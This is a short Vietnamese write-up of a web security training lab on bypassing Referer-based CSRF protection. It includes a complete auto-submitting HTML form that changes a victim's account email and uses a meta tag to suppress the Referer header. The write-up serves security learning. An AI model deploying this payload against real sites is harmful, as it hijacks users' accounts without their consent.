# CSRF where Referer validation depends on header being present

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Đầu tiên chúng ta đăng nhập vào tài khoản `wiener:peter` sau đó bắt request bước thay đổi email.

![image](https://user-images.githubusercontent.com/72268643/158013692-39a68602-f7fd-4d9f-bfdb-5d229322d835.png)

ta thấy so với các lab trước, header của lab này có thêm `HTTP Referer` được trình duyệt thêm vào nhằm chỉ đến nơi các hành động được thực hiện

Tuy nhiên, ta có thể xóa `HTTP Referer` trong request rồi gửi lại thì trang web sẽ vẫn trả về kết quả mà ta yêu cầu thực hiện.

![image](https://user-images.githubusercontent.com/72268643/158014098-c1f3515f-4b1c-4808-af0d-3649998edade.png)

Vậy nên khi viết PoC, ta sẽ thêm thẻ `<meta name="referrer" content="never">` để có thể xóa bỏ `HTTP Referer` trong request
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac2a1fc81e9b67eac0c8024000ba009c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="victim&#64;gmail&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
		<meta name="referrer" content="never">
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
Gửi lên server rồi gửi đến nạn nhân và hoàn thành lab.
